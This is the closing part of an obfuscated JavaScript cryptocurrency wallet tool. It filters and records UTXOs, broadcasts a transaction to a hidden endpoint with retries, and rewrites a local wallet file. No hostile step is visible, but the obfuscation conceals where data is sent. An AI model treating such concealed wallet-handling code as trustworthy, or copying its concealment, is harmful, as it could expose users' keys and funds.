            if (_0x37766d[_0xfc32cd(0x97)][_0xfc32cd(0xd4)](_0xfc32cd(0xd5)) == _0xf65ef1[_0xfc32cd(0x95)] && _0x37766d['outputIndex'] == _0xf65ef1[_0xfc32cd(0xfb)])
                return ![];
        }
        return !![];
    }), _0x96f6fa[_0x4ebdbd(0x109)]['forEach']((_0x110309, _0x35c82e) => {
        const _0x28ad6a = _0x4ebdbd;
        _0x110309['script'][_0x28ad6a(0x10d)]()[_0x28ad6a(0xd4)]() == _0xc4ac7f['address'] && _0xc4ac7f[_0x28ad6a(0xc1)][_0x28ad6a(0xc2)]({
            'txid': _0x96f6fa[_0x28ad6a(0x102)],
            'vout': _0x35c82e,
            'script': _0x110309[_0x28ad6a(0xa7)][_0x28ad6a(0xfa)](),
            'satoshis': _0x110309[_0x28ad6a(0x91)]
        });
    });
}
function _0x4ed0(_0x17cd3f, _0x37eacb) {
    const _0x1d7ed0 = _0x1d7e();
    return _0x4ed0 = function (_0x4ed0de, _0x1cfff5) {
        _0x4ed0de = _0x4ed0de - 0x86;
        let _0x4d3228 = _0x1d7ed0[_0x4ed0de];
        return _0x4d3228;
    }, _0x4ed0(_0x17cd3f, _0x37eacb);
}
async function broadcast(_0x1f5a79, _0x25288f) {
    const _0x1cd4a8 = _0x4977ab, _0x36c566 = _0x1f5a79[_0x1cd4a8(0xd4)]();
    console[_0x1cd4a8(0xff)]('\x1b[36m-------\x20Transaction\x20for\x20Manual\x20Broadcast\x20-------\x1b[0m'), console[_0x1cd4a8(0xff)](_0x36c566), console['log'](_0x1cd4a8(0x118));
    const _0x1ab6b5 = { 'tx': _0x36c566 }, _0x5ebe5e = _0x1cd4a8(0x8e);
    let _0x406fde = 0x0;
    while (!![]) {
        try {
            _0x406fde++, console[_0x1cd4a8(0xff)](_0x1cd4a8(0xbd) + _0x406fde + '):'), await axios[_0x1cd4a8(0xce)](_0x5ebe5e, _0x1ab6b5), console['log'](_0x1cd4a8(0xaf));
            break;
        } catch (_0x5da898) {
            console['log'](_0x1cd4a8(0x110));
            if (!_0x25288f) {
                console[_0x1cd4a8(0xff)](_0x1cd4a8(0x98));
                throw _0x5da898;
            }
            let _0x29f179 = _0x5da898[_0x1cd4a8(0x104)] && _0x5da898[_0x1cd4a8(0x104)][_0x1cd4a8(0x11c)] && _0x5da898[_0x1cd4a8(0x104)][_0x1cd4a8(0x11c)]['error'] && _0x5da898[_0x1cd4a8(0x104)][_0x1cd4a8(0x11c)][_0x1cd4a8(0xd9)][_0x1cd4a8(0xd8)];
            if (_0x29f179 && _0x29f179[_0x1cd4a8(0xc5)](_0x1cd4a8(0x114)))
                console[_0x1cd4a8(0xdf)](_0x1cd4a8(0xdd)), await new Promise(_0x3fa103 => setTimeout(_0x3fa103, 0x3e8));
            else {
                console[_0x1cd4a8(0xff)]('Manual\x20broadcast\x20may\x20be\x20required.\x20Use\x20the\x20serialized\x20transaction\x20above.');
                throw _0x5da898;
            }
        }
    }
    let _0x191a42 = JSON[_0x1cd4a8(0xc3)](fs['readFileSync'](WALLET_PATH));
    updateWallet(_0x191a42, _0x1f5a79), console[_0x1cd4a8(0xff)](_0x1cd4a8(0xf0)), fs[_0x1cd4a8(0xf9)](WALLET_PATH, JSON[_0x1cd4a8(0xd0)](_0x191a42, 0x0, 0x2));
}
function chunkToNumber(_0x5ebcb8) {
    const _0x57ad68 = _0x4977ab;
    if (_0x5ebcb8[_0x57ad68(0xad)] == 0x0)
        return 0x0;
    if (_0x5ebcb8[_0x57ad68(0xad)] == 0x1)
        return _0x5ebcb8[_0x57ad68(0xb9)][0x0];
    if (_0x5ebcb8[_0x57ad68(0xad)] == 0x2)
        return _0x5ebcb8[_0x57ad68(0xb9)][0x1] * 0xff + _0x5ebcb8[_0x57ad68(0xb9)][0x0];
    if (_0x5ebcb8[_0x57ad68(0xad)] > 0x50 && _0x5ebcb8[_0x57ad68(0xad)] <= 0x60)
        return _0x5ebcb8[_0x57ad68(0xad)] - 0x50;
    return undefined;
}
main()['catch'](_0x490585 => {
    const _0x3f67ca = _0x4977ab;
    let _0x3aafa5 = _0x490585[_0x3f67ca(0x104)] && _0x490585[_0x3f67ca(0x104)][_0x3f67ca(0x11c)] && _0x490585['response']['data'][_0x3f67ca(0xd9)] && _0x490585[_0x3f67ca(0x104)]['data'][_0x3f67ca(0xd9)][_0x3f67ca(0xd8)];
    console[_0x3f67ca(0xd9)](_0x3aafa5 ? _0x490585['message'] + ':' + _0x3aafa5 : _0x490585['message']);
});